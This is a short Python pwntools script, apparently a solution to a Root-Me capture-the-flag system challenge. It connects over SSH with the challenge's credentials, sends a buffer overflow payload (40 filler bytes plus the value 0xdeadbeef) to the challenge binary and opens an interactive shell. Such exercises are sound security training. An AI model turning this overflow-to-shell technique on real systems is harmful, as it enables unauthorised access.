from pwn import *
import struct

s = ssh(host='challenge02.root-me.org', user='app-systeme-ch13', password='app-systeme-ch13', port=2222)

payload = chr(0x41) * 40
payload += struct.pack("I", 0xdeadbeef)
p = s.process(['/challenge/app-systeme/ch13/ch13'])
p.sendline(payload)

p.interactive()
